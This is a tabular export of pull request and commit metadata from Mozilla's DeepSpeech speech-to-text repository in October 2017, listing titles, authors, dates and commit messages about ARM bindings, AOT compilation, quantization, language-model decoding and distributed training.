3489,https://api.github.com/repos/mozilla/DeepSpeech/pulls/921,921,Prebuilt arm whl npm with testing,,lissyx,1645737,2017-10-31T10:12:16Z,COLLABORATOR,False,170,32,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfbfe5356ab134d34e8383d4f3b8b0b5a79bb6ad,"Prebuilt ARM Python & NodeJS bindings

Fixes #915"
3490,https://api.github.com/repos/mozilla/DeepSpeech/pulls/921,921,Prebuilt arm whl npm with testing,,lissyx,1645737,2017-10-31T10:12:16Z,COLLABORATOR,False,170,32,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8d5533de0dd3c3b2f8ae3657b80f26acaec4c12b,Python ARM binding test with QEMU
3491,https://api.github.com/repos/mozilla/DeepSpeech/pulls/920,920,Remove scipy dependency from Python bindings,Fixes #919,lissyx,1645737,2017-10-30T17:54:58Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abec2ec512ba4f9c84f4b412e1a1c8ddc46897c2,"Remove scipy dependency from Python bindings

Fixes #919"
3492,https://api.github.com/repos/mozilla/DeepSpeech/pulls/917,917,Prebuilt ARM Python & NodeJS bindings,Fixes #915,lissyx,1645737,2017-10-30T11:43:45Z,COLLABORATOR,True,66,32,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,20e0138900854730c5691473dc1790f6c4d2a99e,"Prebuilt ARM Python & NodeJS bindings

Fixes #915"
3493,https://api.github.com/repos/mozilla/DeepSpeech/pulls/910,910,Experimental aot,,lissyx,1645737,2017-10-26T09:16:32Z,COLLABORATOR,True,710,160,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db09ab7d19adb0ef92599279146ccbe8dccd2b53,Preliminary support for libdeepspeech_model.so
3494,https://api.github.com/repos/mozilla/DeepSpeech/pulls/910,910,Experimental aot,,lissyx,1645737,2017-10-26T09:16:32Z,COLLABORATOR,True,710,160,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42f605790a285a58ad09e35a0483f0dfa4515634,TaskCluster enabling of libdeepspeech_model.so
3495,https://api.github.com/repos/mozilla/DeepSpeech/pulls/907,907,Update docs to highlight prebuilt binaries,And also improve some other details.,reuben,477142,2017-10-25T17:00:48Z,MEMBER,True,67,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c15c2ec3239763e8ba731d00cfe134761039fc3,Fix TFDIR default value in Node.JS bindings Makefile
3496,https://api.github.com/repos/mozilla/DeepSpeech/pulls/907,907,Update docs to highlight prebuilt binaries,And also improve some other details.,reuben,477142,2017-10-25T17:00:48Z,MEMBER,True,67,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bbf9c76ab90ca4f4ce3593cf76befed2a0716b07,Update native client README to highlight prebuilt binaries and include Node.JS docs
3497,https://api.github.com/repos/mozilla/DeepSpeech/pulls/907,907,Update docs to highlight prebuilt binaries,And also improve some other details.,reuben,477142,2017-10-25T17:00:48Z,MEMBER,True,67,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,78f4380721b94458f947051219e51e26af398bed,Address review comments
3498,https://api.github.com/repos/mozilla/DeepSpeech/pulls/907,907,Update docs to highlight prebuilt binaries,And also improve some other details.,reuben,477142,2017-10-25T17:00:48Z,MEMBER,True,67,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c2b7c9b479b44c214ad652435f745b3d3fa2013,"Make sure building the Python binding does not try to create directory ""build"""
3499,https://api.github.com/repos/mozilla/DeepSpeech/pulls/907,907,Update docs to highlight prebuilt binaries,And also improve some other details.,reuben,477142,2017-10-25T17:00:48Z,MEMBER,True,67,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06e2573880f908e44deb9db5bd7947abee142c16,Undo Node.JS makefile dependency change as it breaks automation
3500,https://api.github.com/repos/mozilla/DeepSpeech/pulls/907,907,Update docs to highlight prebuilt binaries,And also improve some other details.,reuben,477142,2017-10-25T17:00:48Z,MEMBER,True,67,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9d8a0605966f48c4e10698fd388bc24f63dd7056,More review comments
3501,https://api.github.com/repos/mozilla/DeepSpeech/pulls/906,906,Stick to scipy 0.19.1,Fixes #905,lissyx,1645737,2017-10-25T13:57:57Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,910964d69417d429205112d9e9a8b285208f437f,"Stick to scipy 0.19.1

Fixes #905"
3502,https://api.github.com/repos/mozilla/DeepSpeech/pulls/903,903,parallelized import_voxforge.py, see #902 ,nkansal96,3259309,2017-10-23T06:46:42Z,CONTRIBUTOR,True,100,20,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e3dbf56705f7bb7fa279f174f5021a3ee13e6983,parallelized import_voxforge.py
3503,https://api.github.com/repos/mozilla/DeepSpeech/pulls/901,901,Add one shot inference mode and make sure test-only runs don't change the checkpoint state,"This makes sure DeepSpeech.py is usable for running test epochs on an externally obtained checkpoint without changing its state, and also a one-shot inference mode that takes in an audio path and does inference on it (again, based on the checkpoint).

The commit moving the deprecation warning to stderr is just so that the only stdout output in one-shot mode is the inference result itself.

Initially I tried hooking into the existing training setup by creating a new ""one-shot"" type of `Job` and using that with the coordinator, but that only lead to frustration debugging a thousand problems. Since all of that code is changing soon anyway, I decided to put this code on an earlier level of the execution, next to `train()` and `export()`.",reuben,477142,2017-10-22T19:58:39Z,MEMBER,True,92,30,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5e861522eb4af83f7080a92453076bb7e81fe71b,Disable checkpointing mechanisms when not training
3504,https://api.github.com/repos/mozilla/DeepSpeech/pulls/901,901,Add one shot inference mode and make sure test-only runs don't change the checkpoint state,"This makes sure DeepSpeech.py is usable for running test epochs on an externally obtained checkpoint without changing its state, and also a one-shot inference mode that takes in an audio path and does inference on it (again, based on the checkpoint).

The commit moving the deprecation warning to stderr is just so that the only stdout output in one-shot mode is the inference result itself.

Initially I tried hooking into the existing training setup by creating a new ""one-shot"" type of `Job` and using that with the coordinator, but that only lead to frustration debugging a thousand problems. Since all of that code is changing soon anyway, I decided to put this code on an earlier level of the execution, next to `train()` and `export()`.",reuben,477142,2017-10-22T19:58:39Z,MEMBER,True,92,30,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0e4bf34e4153e80402436b1e2a35f4363e3e1aa,Add --one_shot_infer <wav_file> parameter to DeepSpeech.py for doing inference on a single audio file
3505,https://api.github.com/repos/mozilla/DeepSpeech/pulls/901,901,Add one shot inference mode and make sure test-only runs don't change the checkpoint state,"This makes sure DeepSpeech.py is usable for running test epochs on an externally obtained checkpoint without changing its state, and also a one-shot inference mode that takes in an audio path and does inference on it (again, based on the checkpoint).

The commit moving the deprecation warning to stderr is just so that the only stdout output in one-shot mode is the inference result itself.

Initially I tried hooking into the existing training setup by creating a new ""one-shot"" type of `Job` and using that with the coordinator, but that only lead to frustration debugging a thousand problems. Since all of that code is changing soon anyway, I decided to put this code on an earlier level of the execution, next to `train()` and `export()`.",reuben,477142,2017-10-22T19:58:39Z,MEMBER,True,92,30,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5be0a2892838dc1a3bc7466f98b4b239b4ca6c88,Print audio.py deprecation warning to stderr
3506,https://api.github.com/repos/mozilla/DeepSpeech/pulls/899,899,Split TaskCluster build scripts and refactor some variables,"This will help landing AOT support, avoiding turning tc-build.sh and
tc-package.sh into a spaghetti mess.

Fixes #898",lissyx,1645737,2017-10-19T12:08:44Z,COLLABORATOR,True,365,192,31,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bd0fedc312d7baf42dca6f311fba97a2a4191732,"Split TaskCluster build scripts and refactor some variables

This will help landing AOT support, avoiding turning tc-build.sh and
tc-package.sh into a spaghetti mess.

Fixes #898"
3507,https://api.github.com/repos/mozilla/DeepSpeech/pulls/897,897,Quantize aot rebase lm split tc,Testing more.,lissyx,1645737,2017-10-19T09:55:48Z,COLLABORATOR,False,1430,360,55,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e67fe197a6fff361ece8cef58b84179be521cec,"WIP: Quantization of model

Fixes #133"
3508,https://api.github.com/repos/mozilla/DeepSpeech/pulls/897,897,Quantize aot rebase lm split tc,Testing more.,lissyx,1645737,2017-10-19T09:55:48Z,COLLABORATOR,False,1430,360,55,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6a74d8c3c36a333ece04d9f568f04591723c8ade,WIP: Tooling for slow 8-bits investigation
3509,https://api.github.com/repos/mozilla/DeepSpeech/pulls/897,897,Quantize aot rebase lm split tc,Testing more.,lissyx,1645737,2017-10-19T09:55:48Z,COLLABORATOR,False,1430,360,55,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b8a881745220adb8a57bca617a0576be3e1cca7c,"Split TaskCluster build scripts and refactor some variables

This will help landing AOT support, avoiding turning tc-build.sh and
tc-package.sh into a spaghetti mess.

Fixes #898"
3510,https://api.github.com/repos/mozilla/DeepSpeech/pulls/897,897,Quantize aot rebase lm split tc,Testing more.,lissyx,1645737,2017-10-19T09:55:48Z,COLLABORATOR,False,1430,360,55,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3f97c157a9b24c137837f48c585c3dcfe4c93944,TC AOT
3511,https://api.github.com/repos/mozilla/DeepSpeech/pulls/897,897,Quantize aot rebase lm split tc,Testing more.,lissyx,1645737,2017-10-19T09:55:48Z,COLLABORATOR,False,1430,360,55,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,19a9b2f440b49d28846b9f730342ac9cd4529b23,WIP: Hacking with AOT/tfcompile
3512,https://api.github.com/repos/mozilla/DeepSpeech/pulls/895,895,Issue 893 894,,lissyx,1645737,2017-10-18T15:47:12Z,COLLABORATOR,True,38,21,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1082a27d4ffa96a75cb59f218cd5553c204bd90b,"Document OSX

Fixes #893"
3513,https://api.github.com/repos/mozilla/DeepSpeech/pulls/895,895,Issue 893 894,,lissyx,1645737,2017-10-18T15:47:12Z,COLLABORATOR,True,38,21,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a4d3869bbf8672d494f7795e063b7b61e29e3ee4,"Download other artifacts than native_client.tar.xz

Fixes #894"
3514,https://api.github.com/repos/mozilla/DeepSpeech/pulls/890,890,In-graph replication and dynamic batch size,"Changes:
- **Dynamic Batch Size** - If no batch size is specified for a data set, it will get determined batch by batch to maximize GPU memory utilization. Available GPU memory is automatically determined at the beginning of the training.
- **In-Graph Replication** - Distributed training is now done by an in-graph replication scheme. Essentially the tower approach across multiple machines. To keep transport overhead low, averaging is done in two stages: 1. Across GPUs on a node. 2. Across nodes
- **Global Sample Count** - Training progress scalar/indicator is now the overall number of samples applied to the model. Replaces gobal step.
- **Sample Precision** - Epochs are now continued on the exact sample they stopped at and are trained by the exact number/set of samples.
- **Cluster Messaging** - For coordination of the cluster and training process, there is a new cross-cluster messaging (RPC) module. It (transparently) uses GRPC.
- **Enhanced Checkpointing** - Two checkpoint cycles: One for the the recent N epochs, another one for the recent M interval checkpoints. ""results.csv"" file logs epoch losses.
- **Enhanced Logging** - Logging has now an additional granularity level below debug (replacing ""traffic"" mode): _step_. Modules can now log by shared logging infrastructure. Modules can get logged by individual log levels.
- **Modularity** - Logging, Messaging, Checkpointing and Persistence are modules  in `util`.
- **Removed** - Unused global WER logging, certain try-catches that hide serieous problems and make debugging harder than necessary, parameter server related code.",tilmankamp,5991088,2017-10-16T15:36:58Z,CONTRIBUTOR,False,1557,1541,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0302c8e1bcca03b786043711367efc463ed1005,In-graph replication and dynamic batch size
3515,https://api.github.com/repos/mozilla/DeepSpeech/pulls/890,890,In-graph replication and dynamic batch size,"Changes:
- **Dynamic Batch Size** - If no batch size is specified for a data set, it will get determined batch by batch to maximize GPU memory utilization. Available GPU memory is automatically determined at the beginning of the training.
- **In-Graph Replication** - Distributed training is now done by an in-graph replication scheme. Essentially the tower approach across multiple machines. To keep transport overhead low, averaging is done in two stages: 1. Across GPUs on a node. 2. Across nodes
- **Global Sample Count** - Training progress scalar/indicator is now the overall number of samples applied to the model. Replaces gobal step.
- **Sample Precision** - Epochs are now continued on the exact sample they stopped at and are trained by the exact number/set of samples.
- **Cluster Messaging** - For coordination of the cluster and training process, there is a new cross-cluster messaging (RPC) module. It (transparently) uses GRPC.
- **Enhanced Checkpointing** - Two checkpoint cycles: One for the the recent N epochs, another one for the recent M interval checkpoints. ""results.csv"" file logs epoch losses.
- **Enhanced Logging** - Logging has now an additional granularity level below debug (replacing ""traffic"" mode): _step_. Modules can now log by shared logging infrastructure. Modules can get logged by individual log levels.
- **Modularity** - Logging, Messaging, Checkpointing and Persistence are modules  in `util`.
- **Removed** - Unused global WER logging, certain try-catches that hide serieous problems and make debugging harder than necessary, parameter server related code.",tilmankamp,5991088,2017-10-16T15:36:58Z,CONTRIBUTOR,False,1557,1541,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,44b32b67e5a6a82c7698a229374cd116b81d7e00,Changes due to PR comments
3516,https://api.github.com/repos/mozilla/DeepSpeech/pulls/890,890,In-graph replication and dynamic batch size,"Changes:
- **Dynamic Batch Size** - If no batch size is specified for a data set, it will get determined batch by batch to maximize GPU memory utilization. Available GPU memory is automatically determined at the beginning of the training.
- **In-Graph Replication** - Distributed training is now done by an in-graph replication scheme. Essentially the tower approach across multiple machines. To keep transport overhead low, averaging is done in two stages: 1. Across GPUs on a node. 2. Across nodes
- **Global Sample Count** - Training progress scalar/indicator is now the overall number of samples applied to the model. Replaces gobal step.
- **Sample Precision** - Epochs are now continued on the exact sample they stopped at and are trained by the exact number/set of samples.
- **Cluster Messaging** - For coordination of the cluster and training process, there is a new cross-cluster messaging (RPC) module. It (transparently) uses GRPC.
- **Enhanced Checkpointing** - Two checkpoint cycles: One for the the recent N epochs, another one for the recent M interval checkpoints. ""results.csv"" file logs epoch losses.
- **Enhanced Logging** - Logging has now an additional granularity level below debug (replacing ""traffic"" mode): _step_. Modules can now log by shared logging infrastructure. Modules can get logged by individual log levels.
- **Modularity** - Logging, Messaging, Checkpointing and Persistence are modules  in `util`.
- **Removed** - Unused global WER logging, certain try-catches that hide serieous problems and make debugging harder than necessary, parameter server related code.",tilmankamp,5991088,2017-10-16T15:36:58Z,CONTRIBUTOR,False,1557,1541,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,af713a82ed3e080f74032d4fb9702f51a1c4d90b,Further return value refactoring
3517,https://api.github.com/repos/mozilla/DeepSpeech/pulls/890,890,In-graph replication and dynamic batch size,"Changes:
- **Dynamic Batch Size** - If no batch size is specified for a data set, it will get determined batch by batch to maximize GPU memory utilization. Available GPU memory is automatically determined at the beginning of the training.
- **In-Graph Replication** - Distributed training is now done by an in-graph replication scheme. Essentially the tower approach across multiple machines. To keep transport overhead low, averaging is done in two stages: 1. Across GPUs on a node. 2. Across nodes
- **Global Sample Count** - Training progress scalar/indicator is now the overall number of samples applied to the model. Replaces gobal step.
- **Sample Precision** - Epochs are now continued on the exact sample they stopped at and are trained by the exact number/set of samples.
- **Cluster Messaging** - For coordination of the cluster and training process, there is a new cross-cluster messaging (RPC) module. It (transparently) uses GRPC.
- **Enhanced Checkpointing** - Two checkpoint cycles: One for the the recent N epochs, another one for the recent M interval checkpoints. ""results.csv"" file logs epoch losses.
- **Enhanced Logging** - Logging has now an additional granularity level below debug (replacing ""traffic"" mode): _step_. Modules can now log by shared logging infrastructure. Modules can get logged by individual log levels.
- **Modularity** - Logging, Messaging, Checkpointing and Persistence are modules  in `util`.
- **Removed** - Unused global WER logging, certain try-catches that hide serieous problems and make debugging harder than necessary, parameter server related code.",tilmankamp,5991088,2017-10-16T15:36:58Z,CONTRIBUTOR,False,1557,1541,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,830747c1b86fa702b20dc85b940e460b6ea639c3,results.csv reading and writing by csv-module
3518,https://api.github.com/repos/mozilla/DeepSpeech/pulls/890,890,In-graph replication and dynamic batch size,"Changes:
- **Dynamic Batch Size** - If no batch size is specified for a data set, it will get determined batch by batch to maximize GPU memory utilization. Available GPU memory is automatically determined at the beginning of the training.
- **In-Graph Replication** - Distributed training is now done by an in-graph replication scheme. Essentially the tower approach across multiple machines. To keep transport overhead low, averaging is done in two stages: 1. Across GPUs on a node. 2. Across nodes
- **Global Sample Count** - Training progress scalar/indicator is now the overall number of samples applied to the model. Replaces gobal step.
- **Sample Precision** - Epochs are now continued on the exact sample they stopped at and are trained by the exact number/set of samples.
- **Cluster Messaging** - For coordination of the cluster and training process, there is a new cross-cluster messaging (RPC) module. It (transparently) uses GRPC.
- **Enhanced Checkpointing** - Two checkpoint cycles: One for the the recent N epochs, another one for the recent M interval checkpoints. ""results.csv"" file logs epoch losses.
- **Enhanced Logging** - Logging has now an additional granularity level below debug (replacing ""traffic"" mode): _step_. Modules can now log by shared logging infrastructure. Modules can get logged by individual log levels.
- **Modularity** - Logging, Messaging, Checkpointing and Persistence are modules  in `util`.
- **Removed** - Unused global WER logging, certain try-catches that hide serieous problems and make debugging harder than necessary, parameter server related code.",tilmankamp,5991088,2017-10-16T15:36:58Z,CONTRIBUTOR,False,1557,1541,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08bcac269ac8e743eeefbf3a109dce0b91f762e0,Better naming of data classes
3519,https://api.github.com/repos/mozilla/DeepSpeech/pulls/884,884,style - README.md - properly stylzing ToC header,"**this PR does basically aim at:**
- *properly stylzing ToC header*

---

**main goal of such does basically lie within:**
- *improving accessability of the overall file*",ghost,10137,2017-10-12T12:10:10Z,NONE,False,2,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4df9de0bfb2bac7b07cd2b5d5db9784198d5f9cc,"style - README.md - properly stylzing ToC header

**this PR does basically aim at:**
- *properly stylzing ToC header*

---

**main goal of such does basically lie within:**
- *improving accessability of the overall file*"
3520,https://api.github.com/repos/mozilla/DeepSpeech/pulls/883,883,WIP: Adding a CTC KenLM Decoder build,,lissyx,1645737,2017-10-12T11:55:51Z,COLLABORATOR,False,81,34,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f8c0880a0647f2a8ea0b3b04635c80640680d3c1,WIP: Adding a CTC KenLM Decoder build
3521,https://api.github.com/repos/mozilla/DeepSpeech/pulls/882,882,Quantize aot rebase lm,New tests.,lissyx,1645737,2017-10-11T09:45:40Z,COLLABORATOR,False,1339,191,43,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,832f8831c10fa47d32f7f2a8995c742736c7d5ff,"WIP: Quantization of model

Fixes #133"
3522,https://api.github.com/repos/mozilla/DeepSpeech/pulls/882,882,Quantize aot rebase lm,New tests.,lissyx,1645737,2017-10-11T09:45:40Z,COLLABORATOR,False,1339,191,43,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,09e29d87bdbd8028b9838f133b8f6d744299004e,WIP: Tooling for slow 8-bits investigation
3523,https://api.github.com/repos/mozilla/DeepSpeech/pulls/882,882,Quantize aot rebase lm,New tests.,lissyx,1645737,2017-10-11T09:45:40Z,COLLABORATOR,False,1339,191,43,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,696d3512d4d939e46712aa42f6bcc9ade6c1e8ef,Preliminary support for libdeepspeech_model.so
3524,https://api.github.com/repos/mozilla/DeepSpeech/pulls/882,882,Quantize aot rebase lm,New tests.,lissyx,1645737,2017-10-11T09:45:40Z,COLLABORATOR,False,1339,191,43,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,109cce0755a0b2c2944cd1038601a900cfa6f7c2,TaskCluster enabling of libdeepspeech_model.so
3525,https://api.github.com/repos/mozilla/DeepSpeech/pulls/882,882,Quantize aot rebase lm,New tests.,lissyx,1645737,2017-10-11T09:45:40Z,COLLABORATOR,False,1339,191,43,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a5ed525497d794f2f288867ac5425d8354cd189,WIP: TFDIR
3526,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfab5e70754dabaec624c2ecab9e2c1f7ed25b0e,Move beam scorer and beam state into a header file
3527,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02a75041aec1795fa8185fc43ee404dd89f96e72,Use the decoder with LM in the native clients
3528,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adfe5e77d9671d88e489f3be9429cbbff3947380,Pass additional LM binary and trie parameters in client tests
3529,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,033d4f765a85323c4753db3ab06219736965340a,Make sure Git LFS is installed across all contexts in tests
3530,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8b059c62354ce231b05fdbaf6a0d51d14882f60,Make the new decoder optional
3531,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,980c66b29c9ea2f9aaffe5977278768f36bf3d43,Add a proper name for the logits output in the graph and use it
3532,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9f9ff38be1791290a9ffc1c09f4bad9361a90295,Benchmark with and without the new decoder
3533,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1ebcf4667b2ad766a143beeeb6b0e5e8560a347e,Only install Git LFS on the Linux test base
3534,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b9f9d0d229a2f03c9412f93250919d91e9aa669,Factor out feature number and context window size constants
3535,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3547ae3f7d34f16a595cfa1f4327e28afeafb660,Update to Git LFS 2.3.1
3536,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,23046a644b64915d95a2793c0ada66496f28e696,Get LM files from the source checkout instead of packaging them
3537,https://api.github.com/repos/mozilla/DeepSpeech/pulls/880,880,My client lm,,lissyx,1645737,2017-10-10T09:29:20Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6e8e5c9836faf693dfb141c9ea8f4ac598991de2,WIP: Debug
3538,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfab5e70754dabaec624c2ecab9e2c1f7ed25b0e,Move beam scorer and beam state into a header file
3539,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,02a75041aec1795fa8185fc43ee404dd89f96e72,Use the decoder with LM in the native clients
3540,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adfe5e77d9671d88e489f3be9429cbbff3947380,Pass additional LM binary and trie parameters in client tests
3541,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,033d4f765a85323c4753db3ab06219736965340a,Make sure Git LFS is installed across all contexts in tests
3542,https://api.github.com/repos/mozilla/DeepSpeech/pulls/878,878,My client lm,,lissyx,1645737,2017-10-09T17:31:28Z,COLLABORATOR,False,435,225,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8b059c62354ce231b05fdbaf6a0d51d14882f60,Make the new decoder optional
